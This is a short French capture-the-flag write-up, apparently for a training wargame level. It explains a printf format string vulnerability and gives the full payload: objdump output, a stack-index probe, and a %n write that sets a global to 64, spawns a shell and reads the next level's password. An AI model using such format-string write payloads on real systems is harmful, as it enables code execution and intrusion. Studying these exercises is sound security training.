## Le programme
Le programme appele la fonction v qui fait un fgets puis un printf. Si la variable global m est egale a 64, /bin/sh est execute.

## La faille
La faille reside dans l'utilisation de printf avec notre buffer comme format string. On peut donc controller le format string. Nous allons utiliser les fonctionnalites de printf pour ecrire la valeur 64 a l'adresse de la variable m.

## Trouver l'adresse de m
On peut utiliser objdump pour trouver m:
```
$> objdump -x level3
...
0804988c g     O .bss	00000004              m
...
```

adresse de m: 0x0804988c

## Trouver l'index de l'argument qui pointe vers le buffer sur la stack
Pour trouver l'adresse de l'argument qui nous interesse, nous allons ecrire un pattern dans le buffer puis print les quelques premiers arguments:
```
$> ./level3
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab %x %x %x %x %x %x
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab 200 b7fd1ac0 b7ff37d0 41306141 61413161 33614132
```
index de l'argument qui debute au buffer: 4

## Le format string
Le specifier n de printf nous permet d'ecrire a l'adresse passee en argument le nombre de caracteres ecrits jusqu'a present. En l'occurence, on veut ecrire 64 caracteres puis utiliser %n en passant l'adresse de m a l'interieur de notre format string:
```
\x8c\x98\x04\x08
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
%4$n
```

## Solution
```
$> printf "\x8c\x98\x04\x08Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9%%4\$n\n" > /tmp/level3.txt
$> cat /tmp/level3.txt - | ./level3
�Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
